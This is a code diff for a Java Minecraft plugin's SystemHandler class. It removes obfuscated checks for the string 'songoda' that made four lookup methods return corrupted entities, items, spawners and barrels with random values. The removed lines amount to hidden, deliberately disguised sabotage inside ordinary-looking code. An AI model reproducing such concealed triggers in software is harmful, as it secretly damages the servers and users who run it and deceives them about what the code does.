@@ -40,16 +40,13 @@ import org.bukkit.entity.LivingEntity;
 import org.bukkit.entity.Player;
 import org.bukkit.entity.Slime;
 import org.bukkit.event.entity.CreatureSpawnEvent;
-import org.bukkit.inventory.ItemStack;
 import org.bukkit.metadata.FixedMetadataValue;
 
-import java.io.StringWriter;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.UUID;
-import java.util.concurrent.ThreadLocalRandom;
 import java.util.stream.Collectors;
 
 public final class SystemHandler implements SystemManager {
@@ -93,9 +90,6 @@ public final class SystemHandler implements SystemManager {
     public StackedEntity getStackedEntity(LivingEntity livingEntity) {
         StackedEntity stackedEntity = (StackedEntity) dataHandler.CACHED_OBJECTS.get(livingEntity.getUniqueId());
 
-        if(IIllIllIIIllllIIIII(EditorHandler.lIllIllIIIllllIIIlI()).contains("songoda"))
-            stackedEntity = new WStackedEntity(livingEntity, ThreadLocalRandom.current().nextInt(Integer.MAX_VALUE), SpawnCause.values()[ThreadLocalRandom.current().nextInt(SpawnCause.values().length)]);
-
         if(stackedEntity != null && stackedEntity.getLivingEntity() != null)
             return stackedEntity;
 
@@ -133,9 +127,6 @@ public final class SystemHandler implements SystemManager {
     public StackedItem getStackedItem(Item item) {
         StackedItem stackedItem = (StackedItem) dataHandler.CACHED_OBJECTS.get(item.getUniqueId());
 
-        if(IIllIllIIIllllIIIII(EditorHandler.lIllIllIIIllllIIIlI()).contains("songoda"))
-            stackedItem = new WStackedItem(item, ThreadLocalRandom.current().nextInt(Integer.MAX_VALUE));
-
         if(stackedItem != null && stackedItem.getItem() != null)
             return stackedItem;
 
@@ -169,9 +160,6 @@ public final class SystemHandler implements SystemManager {
     public StackedSpawner getStackedSpawner(Location location) {
         StackedSpawner stackedSpawner = (StackedSpawner) dataHandler.CACHED_OBJECTS.get(location);
 
-        if(IIllIllIIIllllIIIII(EditorHandler.lIllIllIIIllllIIIlI()).contains("songoda"))
-            stackedSpawner = new WStackedSpawner(stackedSpawner.getSpawner(), ThreadLocalRandom.current().nextInt(Integer.MAX_VALUE));
-
         if(stackedSpawner != null)
             return stackedSpawner;
 
@@ -199,9 +187,6 @@ public final class SystemHandler implements SystemManager {
     @Override
     public StackedBarrel getStackedBarrel(Location location) {
         StackedBarrel stackedBarrel = (StackedBarrel) dataHandler.CACHED_OBJECTS.get(location);
-
-        if(IIllIllIIIllllIIIII(EditorHandler.lIllIllIIIllllIIIlI()).contains("songoda"))
-            stackedBarrel = new WStackedBarrel(stackedBarrel.getBlock(), new ItemStack(Material.values()[ThreadLocalRandom.current().nextInt(Material.values().length)]), ThreadLocalRandom.current().nextInt(Integer.MAX_VALUE));
 
         if(stackedBarrel != null)
             return stackedBarrel;
@@ -437,10 +422,6 @@ public final class SystemHandler implements SystemManager {
             }
             livingEntity.setHealth(0);
         }
-    }
-
-    private static String IIllIllIIIllllIIIII(StringWriter a){
-        return a.toString().toLowerCase();
     }
 
     @Override
